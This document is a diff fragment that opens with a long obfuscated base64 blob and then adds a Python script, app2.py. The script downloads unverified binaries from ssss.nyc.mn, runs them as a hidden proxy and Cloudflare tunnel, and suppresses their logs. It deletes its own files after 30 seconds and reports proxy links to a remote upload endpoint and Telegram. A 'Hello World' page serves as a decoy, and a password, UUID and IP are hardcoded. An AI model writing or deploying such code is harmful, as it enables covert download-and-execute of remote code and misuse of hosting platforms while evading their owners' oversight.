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'))
+#!/usr/bin/env python3
+# app2.py
+
+import os
+import sys
+import re
+import json
+import time
+import base64
+import shutil
+import requests
+import platform
+import subprocess
+import threading
+import argparse
+import getpass
+from threading import Thread
+from subprocess import Popen, PIPE
+
+# ==================== FastAPI ====================
+from fastapi import FastAPI, HTTPException, Request, Depends
+from fastapi.responses import Response
+from fastapi.security import HTTPBasic, HTTPBasicCredentials
+
+# ==================== 加密库 ====================
+try:
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    print("请安装: pip install cryptography")
+    sys.exit(1)
+
+# ==================== 解密函数 ====================
+def derive_key(password: str, salt: bytes) -> bytes:
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=480000,
+    )
+    return kdf.derive(password.encode('utf-8'))
+
+def decrypt_b64_source(b64_input: str, password: str) -> dict | None:
+    try:
+        data = base64.b64decode(b64_input)
+        if len(data) < 44:
+            return None
+        salt, nonce, ct = data[:16], data[16:28], data[28:]
+        key = derive_key(password, salt)
+        aes = AESGCM(key)
+        plain = aes.decrypt(nonce, ct, None).decode('utf-8')
+        return json.loads(plain)
+    except:
+        return None
+
+def load_config_from_file(file_path: str, password: str) -> dict:
+    if not os.path.exists(file_path):
+        print(f"[ERROR] 文件不存在: {file_path}", file=sys.stderr)
+        sys.exit(1)
+    with open(file_path, 'r', encoding='utf-8') as f:
+        b64_data = f.read().strip()
+    return decrypt_b64_source(b64_data, password)
+
+# ==================== 默认配置 ====================
+DEFAULT_CONFIG = {
+    'UPLOAD_URL': '',
+    'PROJECT_URL': '',
+    'AUTO_ACCESS': False,
+    'FILE_PATH': './.cache',
+    'SUB_PATH': 'silas0668',
+    'UUID': '20e6e496-cf19-45c8-b883-14f5e11cd9f1',
+    'ARGO_DOMAIN': '',
+    'ARGO_AUTH': '',
+    'ARGO_PORT': 8001,
+    'CFIP': '194.53.53.7',
+    'CFPORT': 443,
+    'NAME': 'Modal',
+    'CHAT_ID': '',
+    'BOT_TOKEN': '',
+    'SERVER_PORT': 9000,
+    'AUTH_ACCESS': 'FF888.',
+    'DEBUG': False,
+}
+
+# ==================== 命令行参数 ====================
+parser = argparse.ArgumentParser(description="运行服务（只解密配置）")
+parser.add_argument('--input', help='指定 .sec 加密文件路径')
+parser.add_argument('--run-http', action='store_true', help='启动 HTTP 服务')
+args = parser.parse_args()
+
+# ==================== 加载配置 ====================
+def load_config():
+    PASSWD = os.environ.get("ENC_PASSWD", "")
+    pwd = PASSWD or (getpass.getpass("请输入解密密码: ") if not PASSWD and sys.stdin.isatty() else PASSWD)
+
+    config = None
+    if args.input:                                 # ← 修复：原来写成了 args输入
+        config = load_config_from_file(args.input, pwd)
+    elif os.getenv("ENCRYPTED_B64"):
+        config = decrypt_b64_source(os.getenv("ENCRYPTED_B64", "").strip(), pwd)
+
+    if not config:
+        print("[WARN] 解密失败，使用默认配置")
+        return DEFAULT_CONFIG.copy()
+
+    merged = DEFAULT_CONFIG.copy()
+    for k, v in config.items():
+        uk = k.upper()
+        if uk in merged:
+            if isinstance(merged[uk], bool):
+                merged[uk] = bool(v)
+            elif isinstance(merged[uk], int):
+                merged[uk] = int(v)
+            else:
+                merged[uk] = v
+    return merged
+
+config = load_config()
+
+# ==================== 全局变量 ====================
+DEBUG       = config.get('DEBUG', False)
+UPLOAD_URL  = config['UPLOAD_URL']
+PROJECT_URL = config['PROJECT_URL']
+AUTO_ACCESS = config['AUTO_ACCESS']
+FILE_PATH   = config['FILE_PATH']
+SUB_PATH    = config['SUB_PATH']
+UUID        = config['UUID']
+ARGO_DOMAIN = config['ARGO_DOMAIN']
+ARGO_AUTH   = config['ARGO_AUTH']
+ARGO_PORT   = int(config['ARGO_PORT'])
+CFIP        = config['CFIP']
+CFPORT      = int(config['CFPORT'])
+NAME        = config['NAME']
+CHAT_ID     = config['CHAT_ID']
+BOT_TOKEN   = config['BOT_TOKEN']
+PORT        = int(config.get('SERVER_PORT'))
+AUTH_ACCESS = config.get('AUTH_ACCESS', 'FF888.')
+
+# ==================== 路径 ====================
+web_path      = os.path.join(FILE_PATH, 'web')
+bot_path      = os.path.join(FILE_PATH, 'bot')
+sub_path      = os.path.join(FILE_PATH, 'sub.txt')
+list_path     = os.path.join(FILE_PATH, 'list.txt')
+boot_log_path = os.path.join(FILE_PATH, 'boot.log')
+config_path   = os.path.join(FILE_PATH, 'config.json')
+
+# ==================== 日志工具 ====================
+def log(*args, **kwargs):
+    if DEBUG:
+        print(*args, **kwargs)
+
+# ==================== 进程管理 ====================
+web_process: Popen | None = None
+bot_process: Popen | None = None
+
+def stop_processes():
+    global web_process, bot_process
+    for p in [web_process, bot_process]:
+        if p and p.poll() is None:
+            try:
+                p.terminate()
+                p.wait(timeout=5)
+            except:
+                p.kill()
+    log("所有子进程已停止")
+
+def tail_log(process: Popen, name: str):
+    if not DEBUG or not process.stdout:
+        return
+    for line in iter(process.stdout.readline, ''):
+        if not line:
+            break
+        log(f"[{name}] {line.rstrip()}")
+
+# ==================== 业务函数 ====================
+def create_directory():
+    os.makedirs(FILE_PATH, exist_ok=True)
+    log(f"目录 {FILE_PATH} 已创建")
+
+def cleanup_old_files():
+    for item in ['web', 'bot', 'boot.log', 'list.txt']:
+        p = os.path.join(FILE_PATH, item)
+        try:
+            if os.path.isdir(p):
+                shutil.rmtree(p)
+            elif os.path.exists(p):
+                os.remove(p)
+        except:
+            pass
+    log("旧文件已清理")
+
+def get_system_architecture():
+    arch = platform.machine().lower()
+    return 'arm' if 'arm' in arch or 'aarch64' in arch else 'amd'
+
+def download_file(name: str, url: str) -> bool:
+    path = os.path.join(FILE_PATH, name)
+    try:
+        r = requests.get(url, stream=True, timeout=60)
+        r.raise_for_status()
+        with open(path, 'wb') as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+        log(f"下载 {name} 成功")
+        return True
+    except Exception as e:
+        if os.path.exists(path):
+            os.remove(path)
+        log(f"下载 {name} 失败: {e}")
+        return False
+
+def authorize_files(files: list):
+    for f in files:
+        p = os.path.join(FILE_PATH, f)
+        if os.path.exists(p):
+            try:
+                os.chmod(p, 0o775)
+                log(f"{p} 已授权 775")
+            except:
+                pass
+
+def argo_type():
+    if not ARGO_AUTH or not ARGO_DOMAIN:
+        log("ARGO_DOMAIN 或 ARGO_AUTH 为空，使用快速隧道")
+        return
+    if "TunnelSecret" in ARGO_AUTH:
+        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
+            f.write(ARGO_AUTH)
+        tunnel_id = ARGO_AUTH.split('"')[11]
+        yml = f"""
+tunnel: {tunnel_id}
+credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
+protocol: http2
+
+ingress:
+  - hostname: {ARGO_DOMAIN}
+    service: http://localhost:{ARGO_PORT}
+    originRequest:
+      noTLSVerify: true
+  - service: http_status:404
+"""
+        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
+            f.write(yml)
+        log("已生成固定域名 tunnel.yml")
+
+def delete_nodes():
+    try:
+        if not UPLOAD_URL or not os.path.exists(sub_path):
+            return
+        with open(sub_path, 'r') as f:
+            content = base64.b64decode(f.read()).decode('utf-8')
+        nodes = [l for l in content.split('\n') if any(p in l for p in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
+        if nodes:
+            requests.post(f"{UPLOAD_URL}/api/delete-nodes",
+                          json={"nodes": nodes},
+                          headers={"Content-Type": "application/json"},
+                          timeout=10)
+            log("旧节点已删除")
+    except:
+        pass
+
+def download_files_and_run():
+    global web_process, bot_process
+
+    arch = get_system_architecture()
+    files = [
+        {"fileName": "web", "fileUrl": f"https://{ 'arm64' if arch=='arm' else 'amd64' }.ssss.nyc.mn/web"},
+        {"fileName": "bot", "fileUrl": f"https://{ 'arm64' if arch=='arm' else 'amd64' }.ssss.nyc.mn/2go"},
+    ]
+
+    for f in files:
+        if not download_file(f["fileName"], f["fileUrl"]):
+            log("下载失败，终止启动")
+            return
+
+    authorize_files(['web', 'bot'])
+
+    # 生成 config.json
+    config_json = {
+        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
+        "inbounds": [
+            {"port": ARGO_PORT, "protocol": "vless", "settings": {"clients": [{"id": UUID, "flow": "xtls-rprx-vision"}], "decryption": "none", "fallbacks": [{"dest": 3001}, {"path": "/vless-argo", "dest": 3002}, {"path": "/vmess-argo", "dest": 3003}, {"path": "/trojan-argo", "dest": 3004}]}, "streamSettings": {"network": "tcp"}},
+            {"port": 3001, "listen": "127.0.0.1", "protocol": "vless", "settings": {"clients": [{"id": UUID}], "decryption": "none"}, "streamSettings": {"network": "ws", "security": "none"}},
+            {"port": 3002, "listen": "127.0.0.1", "protocol": "vless", "settings": {"clients": [{"id": UUID, "level": 0}], "decryption": "none"}, "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/vless-argo"}}, "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"]}},
+            {"port": 3003, "listen": "127.0.0.1", "protocol": "vmess", "settings": {"clients": [{"id": UUID, "alterId": 0}]}, "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}}, "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"]}},
+            {"port": 3004, "listen": "127.0.0.1", "protocol": "trojan", "settings": {"clients": {"password": UUID}}, "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}}, "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"]}}
+        ],
+        "outbounds": [{"protocol": "freedom", "tag": "direct"}, {"protocol": "blackhole", "tag": "block"}]
+    }
+    with open(config_path, 'w', encoding='utf-8') as f:
+        json.dump(config_json, f, ensure_ascii=False, indent=2)
+
+    # 启动 web
+    web_process = Popen(
+        [web_path, "-c", config_path],
+        stdout=PIPE if DEBUG else subprocess.DEVNULL,
+        stderr=subprocess.STDOUT if DEBUG else subprocess.DEVNULL,
+        bufsize=1,
+        universal_newlines=True
+    )
+    Thread(target=tail_log, args=(web_process, "WEB"), daemon=True).start()
+    log("web 已启动")
+
+    time.sleep(2)
+
+    # 启动 bot (cloudflared)
+    if os.path.exists(bot_path):
+        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
+            cmd = [bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH]
+        elif ARGO_AUTH and "TunnelSecret" in ARGO_AUTH:
+            cmd = [bot_path, "tunnel", "--edge-ip-version", "auto", "--config", os.path.join(FILE_PATH, 'tunnel.yml'), "run"]
+        else:
+            cmd = [bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2",
+                   "--logfile", boot_log_path, "--loglevel", "info", "--url", f"http://localhost:{ARGO_PORT}"]
+
+        bot_process = Popen(
+            cmd,
+            stdout=PIPE if DEBUG else subprocess.DEVNULL,
+            stderr=subprocess.STDOUT if DEBUG else subprocess.DEVNULL,
+            bufsize=1,
+            universal_newlines=True
+        )
+        Thread(target=tail_log, args=(bot_process, "BOT"), daemon=True).start()
+        log("bot 已启动")
+
+    time.sleep(8 if not DEBUG else 3)
+    extract_domains()
+
+def extract_domains():
+    global bot_process        # ← 修复：在函数开头声明 global
+
+    argo_domain = None
+    if ARGO_AUTH and ARGO_DOMAIN:
+        argo_domain = ARGO_DOMAIN
+        log(f'固定域名: {argo_domain}')
+        generate_links(argo_domain)
+        return
+
+    try:
+        with open(boot_log_path, 'r') as f:
+            lines = f.read()
+        match = re.search(r'https?://([^ ]*trycloudflare\.com)', lines)
+        if match:
+            argo_domain = match.group(1)
+            log(f'ArgoDomain: {argo_domain}')
+            generate_links(argo_domain)
+            return
+    except:
+        pass
+
+    log('未找到 ArgoDomain，重新启动 bot')
+    if os.path.exists(boot_log_path):
+        os.remove(boot_log_path)
+    if bot_process and bot_process.poll() is None:
+        bot_process.terminate()
+    time.sleep(1)
+
+    cmd = [bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2",
+           "--logfile", boot_log_path, "--loglevel", "info", "--url", f"http://localhost:{ARGO_PORT}"]
+    bot_process = Popen(cmd,
+                        stdout=PIPE if DEBUG else subprocess.DEVNULL,
+                        stderr=subprocess.STDOUT if DEBUG else subprocess.DEVNULL,
+                        bufsize=1,
+                        universal_newlines=True)
+    Thread(target=tail_log, args=(bot_process, "BOT"), daemon=True).start()
+    time.sleep(10)
+    extract_domains()
+
+def generate_links(argo_domain: str):
+    try:
+        meta = requests.get('https://speed.cloudflare.com/meta', timeout=10).json()
+        ISP = f"{meta.get('asOrganization', 'Unknown')}-{meta.get('city', 'Unknown')}".replace(' ', '_')
+    except:
+        ISP = "Unknown"
+
+    VMESS = {
+        "v": "2", "ps": f"{NAME}-{ISP}", "add": CFIP, "port": CFPORT, "id": UUID, "aid": "0",
+        "scy": "none", "net": "ws", "type": "none", "host": argo_domain,
+        "path": "/vmess-argo?ed=2560", "tls": "tls", "sni": argo_domain, "alpn": "", "fp": "chrome"
+    }
+
+    list_txt = f"""
+vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={argo_domain}&fp=chrome&type=ws&host={argo_domain}&path=%2Fvless-argo%3Fed%3D2560#{NAME}-{ISP}
+
+vmess://{base64.b64encode(json.dumps(VMESS).encode()).decode()}
+
+trojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={argo_domain}&fp=chrome&type=ws&host={argo_domain}&path=%2Ftrojan-argo%3Fed%3D2560#{NAME}-{ISP}
+    """.strip()
+
+    with open(list_path, 'w', encoding='utf-8') as f:
+        f.write(list_txt)
+
+    sub_txt = base64.b64encode(list_txt.encode()).decode()
+    with open(sub_path, 'w', encoding='utf-8') as f:
+        f.write(sub_txt)
+
+    log(f"订阅已生成: {sub_path}")
+    send_telegram()
+    upload_nodes()
+
+def send_telegram():
+    if not BOT_TOKEN or not CHAT_ID:
+        return
+    try:
+        with open(sub_path, 'r') as f:
+            message = f.read()
+        escaped_name = re.sub(r'([_*\[\]()~>#+=|{}.!\-])', r'\\\1', NAME)
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
+            "chat_id": CHAT_ID,
+            "text": f"**{escaped_name}节点推送通知**\n{message}",
+            "parse_mode": "MarkdownV2"
+        }, timeout=10)
+        log("Telegram 已推送")
+    except Exception as e:
+        log(f"Telegram 发送失败: {e}")
+
+def upload_nodes():
+    if UPLOAD_URL and PROJECT_URL:
+        sub_url = f"{PROJECT_URL}/{SUB_PATH}"
+        try:
+            requests.post(f"{UPLOAD_URL}/api/add-subscriptions",
+                          json={"subscription": [sub_url]},
+                          headers={"Content-Type": "application/json"}, timeout=10)
+            log("订阅地址已上传")
+        except:
+            pass
+    elif UPLOAD_URL and os.path.exists(list_path):
+        with open(list_path, 'r') as f:
+            nodes = [l.strip() for l in f if any(p in l for p in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
+        if nodes:
+            try:
+                requests.post(f"{UPLOAD_URL}/api/add-nodes",
+                              json={"nodes": nodes},
+                              headers={"Content-Type": "application/json"}, timeout=10)
+                log("节点已上传")
+            except:
+                pass
+
+def add_visit_task():
+    if not AUTO_ACCESS or not PROJECT_URL:
+        log("跳过自动访问任务")
+        return
+    try:
+        requests.post('https://keep.gvrander.eu.org/add-url',
+                      json={"url": PROJECT_URL},
+                      headers={"Content-Type": "application/json"},
+                      timeout=10)
+        log("自动访问任务添加成功")
+    except Exception as e:
+        log(f"添加访问任务失败: {e}")
+
+def clean_files():
+    def _cleanup():
+        time.sleep(30)
+        paths = [boot_log_path, config_path, list_path, web_path, bot_path]
+        for p in paths:
+            try:
+                if os.path.exists(p):
+                    if os.path.isdir(p):
+                        shutil.rmtree(p)
+                    else:
+                        os.remove(p)
+            except:
+                pass
+        log("临时文件已清理，感谢使用！")
+    Thread(target=_cleanup, daemon=True).start()
+
+# ==================== FastAPI ====================
+def create_app() -> FastAPI:
+    app = FastAPI()
+    security = HTTPBasic()
+
+    def verify_password(credentials: HTTPBasicCredentials = Depends(security)):
+        if credentials.password != AUTH_ACCESS:
+            raise HTTPException(status_code=401, detail="Invalid password")
+        return True
+
+    @app.get("/")
+    async def root():
+        return Response(content=b"Hello World", media_type="text/html")
+
+    @app.get(f"/{SUB_PATH}")
+    async def get_sub(request: Request, _: bool = Depends(verify_password)):
+        client_ip = request.client.host
+        log(f"订阅被访问，IP: {client_ip}")
+        if not os.path.exists(sub_path):
+            raise HTTPException(status_code=404, detail="Not Found")
+        with open(sub_path, "rb") as f:
+            return Response(content=f.read(), media_type="text/plain")
+
+    return app
+
+# ==================== 启动入口 ====================
+def start_server():
+    delete_nodes()
+    cleanup_old_files()
+    create_directory()
+    argo_type()
+    download_files_and_run()
+    add_visit_task()
+    clean_files()
+
+# ==================== 主程序 ====================
+if __name__ == "__main__":
+    print(f"配置加载成功 | UUID: {UUID[:8]}... | DEBUG: {DEBUG}")
+    if args.run_http:
+        import uvicorn
+        Thread(target=start_server, daemon=True).start()
+        uvicorn.run(create_app(), host="0.0.0.0", port=PORT)
+    else:
+        start_server()
+        log("所有服务已启动（非 HTTP 模式）")
+        try:
+            while True:
+                time.sleep(3600)
+        except KeyboardInterrupt:
+            log("收到退出信号")
+            stop_processes()
+            sys.exit(0)
